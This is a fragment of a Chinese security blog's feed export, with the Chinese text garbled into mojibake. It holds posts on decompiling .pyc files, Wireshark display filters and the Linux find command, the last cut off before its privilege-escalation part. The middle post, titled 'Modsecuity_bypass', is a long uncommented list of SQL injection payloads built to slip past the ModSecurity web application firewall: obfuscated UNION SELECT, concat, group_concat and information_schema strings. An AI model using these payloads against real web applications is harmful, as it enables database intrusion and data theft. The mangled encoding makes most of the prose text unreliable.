<h4 id="å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç "><a href="#å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç " class="headerlink" title="å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç "></a>å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç </h4><h5 id="åœ¨çº¿pycåç¼–è¯‘"><a href="#åœ¨çº¿pycåç¼–è¯‘" class="headerlink" title="åœ¨çº¿pycåç¼–è¯‘"></a>åœ¨çº¿pycåç¼–è¯‘</h5><p> <a href="https://tool.lu/pyc">https://tool.lu/pyc</a></p>
<p><img src="/posts/76fcd9b1/7.PNG" alt="æˆªå›¾"></p>
<h5 id="ä½¿ç”¨-uncompyle6"><a href="#ä½¿ç”¨-uncompyle6" class="headerlink" title="ä½¿ç”¨ uncompyle6"></a>ä½¿ç”¨ <code>uncompyle6</code></h5><p> (éœ€è¦ä½¿ç”¨pip å®‰è£… <code>pip install uncompyle6</code>  ä½†æ˜¯ä¸æ”¯æŒpython3.9ç‰ˆæœ¬) </p>
<p><code>uncompyle6 test.pyc</code> å³å¯æŸ¥çœ‹pythonä»£ç <br><img src="/posts/76fcd9b1/8.PNG" alt="æˆªå›¾"><br>ä¹Ÿå¯ä»¥å°†å†…å®¹ä¿å­˜åˆ°test.py <code>uncompyle6 test.pyc &gt; test.py</code></p>
<p>è¸©å‘ï¼š<br>ï¼ˆåœ¨ä½¿ç”¨æ—¶ ç”±äºæœ¬æœºå†…pythonç¯å¢ƒæ¯”è¾ƒå¤æ‚  æœ‰ä¸‰ä¸ªç¯å¢ƒ ç»“æœæå¾—ç‰ˆæœ¬ä¸ç»Ÿä¸€ ç„¶åä¸€ç›´æŠ¥é”™pycçš„magic å¤±è´¥ çœ‹äº†ä¸‹<a href="https://fishc.com.cn/forum.php?mod=viewthread&tid=131172&highlight=pyc+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">https://fishc.com.cn/forum.php?mod=viewthread&amp;tid=131172&amp;highlight=pyc%2B%B7%B4%BB%E3%B1%E0</a> æ„è¯†åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼‰ åœ¨è™šæ‹Ÿæœºä¸Šå°±å¯ä»¥æˆåŠŸé¿å…è¿™ç§é—®é¢˜</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/10450#toc-11">https://xz.aliyun.com/t/10450#toc-11</a></p>
<p><a href="https://fishc.com.cn/thread-131172-1-1.html">https://fishc.com.cn/thread-131172-1-1.html</a></p>
<p><a href="https://jishuin.proginn.com/p/763bfbd69fa1">https://jishuin.proginn.com/p/763bfbd69fa1</a></p>
<p><a href="https://www.cxymm.net/article/qq_36078992/103596170">https://www.cxymm.net/article/qq_36078992/103596170</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>wiresharkå­¦ä¹ -1</title>
    <url>/posts/6c4c4fdf/</url>
    <content><![CDATA[<h3 id="wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼"><a href="#wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼" class="headerlink" title="wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼"></a>wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼</h3><p><img src="/posts/6c4c4fdf/1.png" alt="æˆªå›¾"></p>
<h3 id="wiresharkä¸­-é»˜è®¤çš„åˆ—"><a href="#wiresharkä¸­-é»˜è®¤çš„åˆ—" class="headerlink" title="wiresharkä¸­ é»˜è®¤çš„åˆ—"></a>wiresharkä¸­ é»˜è®¤çš„åˆ—</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No. ï¼šæ•è·çš„æ•°æ®å¸§åºå·ï¼Œç¬¬ä¸€å¸§å§‹ç»ˆä¸º 1ã€‚</span><br><span class="line">Time ï¼šä»æ•è·çš„ç¬¬ä¸€å¸§å¼€å§‹çš„è®¡ç®—çš„æ—¶é—´ï¼ˆå•ä½ä¸ºçº³ç§’ï¼‰ï¼Œç¬¬ä¸€å¸§æ ‡è®°ä¸º 0.000000ã€‚</span><br><span class="line">Source ï¼šæºåœ°å€ï¼Œé€šå¸¸æ˜¯ IPv4ã€IPv6 æˆ–è€… ä»¥å¤ªç½‘åœ°å€ã€‚</span><br><span class="line">Destination ï¼šç›®çš„åœ°å€ï¼Œé€šå¸¸æ˜¯ IPv4ã€IPv6 æˆ–è€… ä»¥å¤ªç½‘åœ°å€ã€‚</span><br><span class="line">Protocol ï¼šä»¥å¤ªç½‘å¸§ã€IPæ•°æ®åŒ…ã€TCPåˆ†ç‰‡æ‰€ä½¿ç”¨çš„åè®®ï¼ˆARPã€DNSã€TCPã€HTTPç­‰ï¼‰ã€‚</span><br><span class="line">Length ï¼šæ•°æ®å¸§é•¿åº¦ï¼ˆå•ä½ä¸ºå­—èŠ‚ï¼‰ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="éšè—ä¸éœ€è¦çš„åˆ—"><a href="#éšè—ä¸éœ€è¦çš„åˆ—" class="headerlink" title="éšè—ä¸éœ€è¦çš„åˆ—"></a>éšè—ä¸éœ€è¦çš„åˆ—</h4><p>å¯ä»¥é€šè¿‡å³é”®æ ‡é¢˜æ  é€‰æ‹©éšè—ä¸éœ€è¦çš„åˆ—</p>
<h4 id="åˆ é™¤ä¸éœ€è¦çš„åˆ—"><a href="#åˆ é™¤ä¸éœ€è¦çš„åˆ—" class="headerlink" title="åˆ é™¤ä¸éœ€è¦çš„åˆ—"></a>åˆ é™¤ä¸éœ€è¦çš„åˆ—</h4><p>å¦‚æœæœ‰äº›åˆ—ç”¨ä¸åˆ° å¯ä»¥é€‰æ‹©è¯¥åˆ—åå³é”® -&gt; Remove This Column è¿›è¡Œåˆ é™¤</p>
<h4 id="æ·»åŠ éœ€è¦çš„åˆ—"><a href="#æ·»åŠ éœ€è¦çš„åˆ—" class="headerlink" title="æ·»åŠ éœ€è¦çš„åˆ—"></a>æ·»åŠ éœ€è¦çš„åˆ—</h4><p>å³é”®ç‚¹å‡»æ ‡é¢˜æ  é€‰æ‹©<code>Column Preferences</code> ç‚¹å‡»å·¦ä¸‹è§’çš„ <code>+</code>  åˆ—è¡¨ä¸­å°†ä¼šå‡ºç°ä¸€ä¸ªæ ‡é¢˜ä¸ºNew Columnçš„è¡¨é¡¹ã€‚</p>
<h4 id="ä¿®æ”¹æ—¶é—´æ ¼å¼"><a href="#ä¿®æ”¹æ—¶é—´æ ¼å¼" class="headerlink" title="ä¿®æ”¹æ—¶é—´æ ¼å¼"></a>ä¿®æ”¹æ—¶é—´æ ¼å¼</h4><p>ç‚¹å‡»èœå•æ çš„ <code>è§†å›¾</code> é€‰æ‹© <code>æ—¶é—´æ˜¾ç¤ºæ ¼å¼</code> å¯ä»¥å»é€‰æ‹©<code>UTC</code> ç§’ç­‰</p>
<h4 id="æ·»åŠ è‡ªå®šä¹‰åˆ—"><a href="#æ·»åŠ è‡ªå®šä¹‰åˆ—" class="headerlink" title="æ·»åŠ è‡ªå®šä¹‰åˆ—"></a>æ·»åŠ è‡ªå®šä¹‰åˆ—</h4><p>å¯ä»¥é€‰æ‹©æ•°æ®åŒ…ç»†èŠ‚çª—å£ é€‰æ‹©éœ€è¦æ·»åŠ çš„æ•°æ® å³é”®ç‚¹å‡»åº”ç”¨ä¸ºåˆ— å³å¯æˆåŠŸæ·»åŠ </p>
<hr>
<p>èƒŒæ™¯ä¸ºçº¢è‰² =&gt; è¿™ä¸ªè¡¨è¾¾å¼å°šæœªè¢«æ¥å—</p>
<p>èƒŒæ™¯ä¸ºç»¿è‰² =&gt; è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥æ­£å¸¸å·¥ä½œ</p>
<p>èƒŒæ™¯ä¸ºé»„è‰² =&gt; è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥è¢«æ¥å—ï¼Œä½†æ˜¯å¯èƒ½ä¸ä¼šæŒ‰é¢„æœŸå·¥ä½œ</p>
<br>

<p>wireshark æ˜¾ç¤ºè¿‡æ»¤å™¨   å¸ƒå°”è¡¨è¾¾å¼</p>
<ul>
<li>ç­‰äº        ==  æˆ– eq</li>
<li>ä¸”            &amp;&amp; æˆ– and</li>
<li>æˆ–             ||       æˆ– or</li>
</ul>
<br>

<p>eg</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.addr eq 192.168.10.195 and ip.addr &#x3D;&#x3D; 192.168.10.1</span><br><span class="line"></span><br><span class="line">http.request &amp;&amp; ip.addr &#x3D;&#x3D; 192.168.10.195</span><br><span class="line"></span><br><span class="line">http.request || http.response</span><br><span class="line"></span><br><span class="line">dns.qry.name contains microsoft or dns.qry.name contains windows</span><br></pre></td></tr></table></figure>

<br>

<p>é€‰æ‹©æ’é™¤ç‰¹å®šå€¼æ—¶ ä¸è¦åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨ != </p>
<p>å¯ä»¥ä½¿ç”¨<code>!(ip.addr == 192.168.10.1)</code>  è€Œä¸æ˜¯ä½¿ç”¨<code>ip.addr != 192.168.10.1</code></p>
<br>

<p><code>http.request or ssl.handshake.type == 1</code></p>
<p><code>http.request</code>  </p>
<p><code>ssl.handshake.type == 1</code></p>
<br>

<hr>
<h3 id="è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·"><a href="#è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·" class="headerlink" title="è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·"></a>è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·</h3><h4 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h4><br>

<h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4>]]></content>
  </entry>
  <entry>
    <title>Modsecuity_bypass</title>
    <url>/posts/1460cbad/</url>
    <content><![CDATA[<h3 id="Union-Select"><a href="#Union-Select" class="headerlink" title="Union Select"></a>Union Select</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!50000%55nIoN*&#x2F; &#x2F;*!50000%53eLeCt*&#x2F;</span><br><span class="line">%55nion(%53elect 1,2,3)-- -</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!12345UNION SELECT*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!50000UNION SELECT*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;**&#x2F;UNION&#x2F;**&#x2F;&#x2F;*!50000SELECT*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*!50000UniON SeLeCt*&#x2F;</span><br><span class="line">union &#x2F;*!50000%53elect*&#x2F;</span><br><span class="line">+ #?uNiOn + #?sEleCt</span><br><span class="line">+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">&#x2F;*!%55NiOn*&#x2F; &#x2F;*!%53eLEct*&#x2F;</span><br><span class="line">&#x2F;*!u%6eion*&#x2F; &#x2F;*!se%6cect*&#x2F;</span><br><span class="line">+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect</span><br><span class="line">uni%0bon+se%0blect</span><br><span class="line">%2f**%2funion%2f**%2fselect</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">REVERSE(noinu)+REVERSE(tceles)</span><br><span class="line">&#x2F;*--*&#x2F;union&#x2F;*--*&#x2F;select&#x2F;*--*&#x2F;</span><br><span class="line">union (&#x2F;*!&#x2F;**&#x2F; SeleCT *&#x2F; 1,2,3)</span><br><span class="line">&#x2F;*!union*&#x2F;+&#x2F;*!select*&#x2F;</span><br><span class="line">union+&#x2F;*!select*&#x2F;</span><br><span class="line">&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;</span><br><span class="line">&#x2F;**&#x2F;uNIon&#x2F;**&#x2F;sEleCt&#x2F;**&#x2F;</span><br><span class="line">+%2F**&#x2F;+Union&#x2F;*!select*&#x2F;</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!union*&#x2F;&#x2F;**&#x2F;&#x2F;*!select*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*!uNIOn*&#x2F; &#x2F;*!SelECt*&#x2F;</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">uNiOn aLl sElEcT</span><br><span class="line">UNIunionON+SELselectECT</span><br><span class="line">&#x2F;**&#x2F;union&#x2F;*!50000select*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">0%a0union%a0select%09</span><br><span class="line">%0Aunion%0Aselect%0A</span><br><span class="line">%55nion&#x2F;**&#x2F;%53elect</span><br><span class="line">uni&lt;on all&#x3D;&quot;&quot; sel&#x3D;&quot;&quot;&gt;&#x2F;*!20000%0d%0aunion*&#x2F;+&#x2F;*!20000%0d%0aSelEct*&#x2F;</span><br><span class="line">%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT%252f%252a*&#x2F;</span><br><span class="line">%0A%09UNION%0CSELECT%10NULL%</span><br><span class="line">&#x2F;*!union*&#x2F;&#x2F;*--*&#x2F;&#x2F;*!all*&#x2F;&#x2F;*--*&#x2F;&#x2F;*!select*&#x2F;</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">&#x2F;*!20000%0d%0aunion*&#x2F;+&#x2F;*!20000%0d%0aSelEct*&#x2F;</span><br><span class="line">+UnIoN&#x2F;*&amp;a&#x3D;*&#x2F;SeLeCT&#x2F;*&amp;a&#x3D;*&#x2F;</span><br><span class="line">union+sel%0bect</span><br><span class="line">+uni*on+sel*ect+</span><br><span class="line">+#1q%0Aunion all#qa%0A#%0Aselect</span><br><span class="line">union(select (1),(2),(3),(4),(5))</span><br><span class="line">UNION(SELECT(column)FROM(table))</span><br><span class="line">%23xyz%0AUnIOn%23xyz%0ASeLecT+</span><br><span class="line">%23xyz%0A%55nIOn%23xyz%0A%53eLecT+</span><br><span class="line">union(select(1),2,3)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">uNioN (&#x2F;*!&#x2F;**&#x2F; SeleCT *&#x2F; 11)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">+#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*U*&#x2F;&#x2F;*n*&#x2F;&#x2F;*I*&#x2F;&#x2F;*o*&#x2F;&#x2F;*N*&#x2F;&#x2F;*S*&#x2F;&#x2F;*e*&#x2F;&#x2F;*L*&#x2F;&#x2F;*e*&#x2F;&#x2F;*c*&#x2F;&#x2F;*T*&#x2F;</span><br><span class="line">%0A&#x2F;**&#x2F;&#x2F;*!50000%55nIOn*&#x2F;&#x2F;*yoyu*&#x2F;all&#x2F;**&#x2F;%0A&#x2F;*!%53eLEct*&#x2F;%0A&#x2F;*nnaa*&#x2F;</span><br><span class="line">+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+</span><br><span class="line">+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">&#x2F;*!f****U%0d%0aunion*&#x2F;+&#x2F;*!f****U%0d%0aSelEct*&#x2F;</span><br><span class="line">+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+</span><br><span class="line">&#x2F;*!blobblobblob%0d%0aunion*&#x2F;+&#x2F;*!blobblobblob%0d%0aSelEct*&#x2F;</span><br><span class="line">&#x2F;union\sselect&#x2F;g</span><br><span class="line">&#x2F;union\s+select&#x2F;i</span><br><span class="line">&#x2F;*!UnIoN*&#x2F;SeLeCT</span><br><span class="line">+UnIoN&#x2F;*&amp;a&#x3D;*&#x2F;SeLeCT&#x2F;*&amp;a&#x3D;*&#x2F;</span><br><span class="line">+uni&gt;on+sel&gt;ect+</span><br><span class="line">+(UnIoN)+(SelECT)+</span><br><span class="line">+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line">+â€™UnIâ€Onâ€™+&#39;SeLâ€ECTâ€™</span><br><span class="line">+uni on+sel ect+</span><br><span class="line">+&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLeCt*&#x2F;+</span><br><span class="line">&#x2F;*!u%6eion*&#x2F; &#x2F;*!se%6cect*&#x2F;</span><br><span class="line">uni%20union%20&#x2F;*!select*&#x2F;%20</span><br><span class="line">union%23aa%0Aselect</span><br><span class="line">&#x2F;**&#x2F;union&#x2F;*!50000select*&#x2F;</span><br><span class="line">&#x2F;^.*union.*$&#x2F; &#x2F;^.*select.*$&#x2F;</span><br><span class="line">&#x2F;*union*&#x2F;union&#x2F;*select*&#x2F;select+</span><br><span class="line">&#x2F;*uni X on*&#x2F;union&#x2F;*sel X ect*&#x2F;</span><br><span class="line">+un&#x2F;**&#x2F;ion+sel&#x2F;**&#x2F;ect+</span><br><span class="line">+UnIOn%0d%0aSeleCt%0d%0a</span><br><span class="line">UNION&#x2F;*&amp;test&#x3D;1*&#x2F;SELECT&#x2F;*&amp;pwn&#x3D;2*&#x2F;</span><br><span class="line">un?&lt;ion sel&#x3D;&quot;&quot;&gt;+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+</span><br><span class="line">+UNunionION+SEselectLECT+</span><br><span class="line">+uni%0bon+se%0blect+</span><br><span class="line">%252f%252a*&#x2F;union%252f%252a &#x2F;select%252f%252a*&#x2F;</span><br><span class="line">&#x2F;%2A%2A&#x2F;union&#x2F;%2A%2A&#x2F;select&#x2F;%2A%2A&#x2F;</span><br><span class="line">%2f**%2funion%2f**%2fselect%2f**%2f</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">&#x2F;*!UnIoN*&#x2F;SeLecT+</span><br></pre></td></tr></table></figure>

<h3 id="Concat"><a href="#Concat" class="headerlink" title="Concat"></a>Concat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CoNcAt()</span><br><span class="line">concat() </span><br><span class="line">CON%08CAT()</span><br><span class="line">CoNcAt()</span><br><span class="line">%0AcOnCat()</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!12345cOnCat*&#x2F;</span><br><span class="line">&#x2F;*!50000cOnCat*&#x2F;(&#x2F;*!*&#x2F;)</span><br><span class="line">unhex(hex(concat(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!12345concat*&#x2F;(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!50000concat*&#x2F;(table_name)))</span><br></pre></td></tr></table></figure>

<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!group_concat*&#x2F;()</span><br><span class="line">gRoUp_cOnCAt()</span><br><span class="line">group_concat(&#x2F;*!*&#x2F;)</span><br><span class="line">group_concat(&#x2F;*!12345table_name*&#x2F;)</span><br><span class="line">group_concat(&#x2F;*!50000table_name*&#x2F;)</span><br><span class="line">&#x2F;*!group_concat*&#x2F;(&#x2F;*!12345table_name*&#x2F;)</span><br><span class="line">&#x2F;*!group_concat*&#x2F;(&#x2F;*!50000table_name*&#x2F;)</span><br><span class="line">&#x2F;*!12345group_concat*&#x2F;(&#x2F;*!12345table_name*&#x2F;)</span><br><span class="line">&#x2F;*!50000group_concat*&#x2F;(&#x2F;*!50000table_name*&#x2F;)</span><br><span class="line">&#x2F;*!GrOuP_ConCaT*&#x2F;()</span><br><span class="line">&#x2F;*!12345GroUP_ConCat*&#x2F;()</span><br><span class="line">&#x2F;*!50000gRouP_cOnCaT*&#x2F;()</span><br><span class="line">&#x2F;*!50000Gr%6fuP_c%6fnCAT*&#x2F;()</span><br><span class="line">unhex(hex(group_concat(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!group_concat*&#x2F;(&#x2F;*!table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!12345group_concat*&#x2F;(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!12345group_concat*&#x2F;(&#x2F;*!table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!12345group_concat*&#x2F;(&#x2F;*!12345table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!50000group_concat*&#x2F;(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!50000group_concat*&#x2F;(&#x2F;*!table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!50000group_concat*&#x2F;(&#x2F;*!50000table_name*&#x2F;)))</span><br><span class="line">convert(group_concat(table_name)+using+ascii)</span><br><span class="line">convert(group_concat(&#x2F;*!table_name*&#x2F;)+using+ascii)</span><br><span class="line">convert(group_concat(&#x2F;*!12345table_name*&#x2F;)+using+ascii)</span><br><span class="line">convert(group_concat(&#x2F;*!50000table_name*&#x2F;)+using+ascii)</span><br><span class="line">CONVERT(group_concat(table_name)+USING+latin1)</span><br></pre></td></tr></table></figure>

<h3 id="Information-schema-tables"><a href="#Information-schema-tables" class="headerlink" title="Information_schema.tables"></a>Information_schema.tables</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F;&#x3D;schEMA()-- -</span><br><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F; like schEMA()-- -</span><br><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F;&#x3D;database()-- -</span><br><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F; like database()-- -</span><br><span class="line">&#x2F;*!FrOm*&#x2F;+%69nformation_schema.&#x2F;**&#x2F;columns+&#x2F;*!50000Where*&#x2F;+&#x2F;*!%54able_name*&#x2F;&#x3D;hex table</span><br><span class="line">&#x2F;*!FrOm*&#x2F;+information_schema.&#x2F;**&#x2F;columns+&#x2F;*!12345Where*&#x2F;+&#x2F;*!%54able_name*&#x2F; like hex table</span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92">https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92</a></p>
<p><a href="https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad">https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad</a></p>
</blockquote>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>findå‘½ä»¤ä¸ææƒ</title>
    <url>/posts/355e240e/</url>
    <content><![CDATA[<h3 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>â€“help  -help</td>
<td>å¸®åŠ©</td>
</tr>
<tr>
<td>-name</td>
<td>æŒ‰æ–‡ä»¶åæŸ¥æ‰¾</td>
</tr>
<tr>
<td>-iname</td>
<td>æ•ˆæœä¸-nameç±»ä¼¼ï¼Œä½†å¿½ç•¥å­—ç¬¦å¤§å°å†™</td>
</tr>
<tr>
<td>-type</td>
<td>åªå¯»æ‰¾ç¬¦åˆæŒ‡å®šçš„æ–‡ä»¶ç±»å‹çš„æ–‡ä»¶,  d ç›®å½•       f æ–‡ä»¶        c å­—ç¬¦è®¾å¤‡æ–‡ä»¶         b å—è®¾å¤‡æ–‡ä»¶</td>
</tr>
<tr>
<td>-print</td>
<td>å°†æ–‡ä»¶æˆ–ç›®å½•åç§°åˆ—å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚æ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªåç§°ï¼Œæ¯ä¸ªåç§°å‰çš†æœ‰â€./â€œå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>-prune</td>
<td>å¦‚æœæ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå°±ä¸ä¼šè¿›å…¥æ­¤ç›®å½•</td>
</tr>
<tr>
<td>-size n</td>
<td>næ˜¯æ–‡ä»¶å¤§å°å•ä½</td>
</tr>
<tr>
<td>-perm</td>
<td>æŒ‰ç…§æ–‡ä»¶æƒé™æ¥æŸ¥æ‰¾æ–‡ä»¶ï¼Œ4000ï¼Œ2000,1000ä¸ºåˆ†åˆ«è¡¨ç¤ºSUID,SGID,SBITï¼Œå¦‚777ä¸ºæ™®é€šæ–‡ä»¶çš„æœ€é«˜æƒé™ï¼Œ7000ä¸ºç‰¹æ®Šæ–‡ä»¶çš„æœ€é«˜æƒé™</td>
</tr>
<tr>
<td>-exec</td>
<td>findå‘½ä»¤å¯¹åŒ¹é…çš„æ–‡ä»¶æ‰§è¡Œè¯¥å‚æ•°æ‰€ç»™å‡ºçš„shellå‘½ä»¤ã€‚ç›¸åº”å‘½ä»¤çš„å½¢å¼ä¸ºâ€™commandâ€™ { } ;ï¼Œæ³¨æ„{ }å’Œ\ï¼›ä¹‹é—´çš„ç©ºæ ¼</td>
</tr>
</tbody></table>
<p>å®ä¾‹</p>
<p><code>find .</code> åˆ—å‡ºå½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</p>
<p><code>find .  -name  &quot;*-txt&quot;</code>  æ‰¾å‡ºå½“å‰æ–‡ä»¶åŠ ä¸‹çš„.txtæ–‡ä»¶</p>
<p><code>find . -nmae &quot;*.txt&quot; -o -name &quot;*.py&quot;</code> æ‰¾å‡ºå½“å‰æ–‡ä»¶å¤¹ä¸‹çš„.txtæ–‡ä»¶å’Œå­ç›®å½•ä¸‹çš„.pyæ–‡ä»¶</p>
<p><code>find . ! -name  &quot;*-txt&quot; </code> æ‰¾å‡ºå½“å‰ç›®å½•ä¸‹ä¸ä¸º.txtçš„æ–‡ä»¶</p>
<p><code>find . -type &lt;ç±»å‹å‚æ•°&gt;</code></p>
<table>
<thead>
<tr>
<th>ç±»å‹å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>f</td>
<td>æ™®é€šæ–‡ä»¶</td>
</tr>
<tr>
<td>d</td>
<td>ç›®å½•</td>
</tr>
<tr>
<td>p</td>
<td>ç®¡é“FIFO</td>
</tr>
<tr>
<td>s</td>
<td>å¥—æ¥å­—</td>
</tr>
<tr>
<td>l</td>
<td>ç¬¦å·è¿æ¥</td>
</tr>
<tr>
<td>b</td>
<td>å—è®¾å¤‡</td>
</tr>
<tr>
<td>c</td>
<td>å­—ç¬¦è®¾å¤‡</td>
</tr>
</tbody></table>
<p><code>find . -type f -name &quot;*-txt&quot;  -delete </code> åˆ é™¤åŒ¹é…çš„txtæ–‡ä»¶</p>
<p><code>find  -perm -777  -type f | sort</code> æŸ¥æ‰¾æƒé™ä¸º777çš„æ–‡ä»¶æˆ–ç›®å½•å¹¶æ’åº</p>
<p><code>find -type f -name &quot;*.txt&quot; -exec cat &#123;&#125; \; &gt; all.txt</code> å°†æ‰€æœ‰çš„txtæ–‡ä»¶æ‹¼æ¥å¹¶å†™å…¥åˆ°all.txt</p>
<p>å•è¡Œå‘½ä»¤çš„-execæ— æ³•æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œæ‰§è¡Œå¤šè¡Œå‘½ä»¤çš„è¯å°±éœ€è¦åˆ›å»ºä¸€ä¸ªtest.sh  è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ç»™777æƒé™ <code>chmod 777 test.sh</code></p>
<p>test.sh å†…å®¹ä¸ºä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat all.txt</span><br></pre></td></tr></table></figure>

<p><code>find &#39;all.txt&#39; -exec  ./test.sh  &#123;&#125; \;</code></p>
<p><img src="/posts/355e240e/find_exec_sh.png"></p>
<h3 id="2-gt-dev-null"><a href="#2-gt-dev-null" class="headerlink" title="2&gt; /dev/null"></a>2&gt; /dev/null</h3><br>

<p>æ–‡ä»¶æè¿°ç¬¦</p>
<p>0    æ ‡å‡†è¾“å…¥(stdin)</p>
<p>1    æ ‡å‡†è¾“å‡º(stdout)</p>
<p>2    æ ‡å‡†é”™è¯¯(stderror)</p>
<p>é‡å®šå‘</p>
<p><code>&gt;</code> æ¸…ç©ºæ–‡ä»¶ å†å†™å…¥å†…å®¹</p>
<p><code>&gt;&gt;</code> è¿½åŠ åˆ°æ–‡ä»¶å°¾éƒ¨</p>
<p><code>2&gt;/dev/null</code><br>æ„æ€å°±æ˜¯æŠŠé”™è¯¯è¾“å‡ºåˆ°â€œé»‘æ´â€</p>
<p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
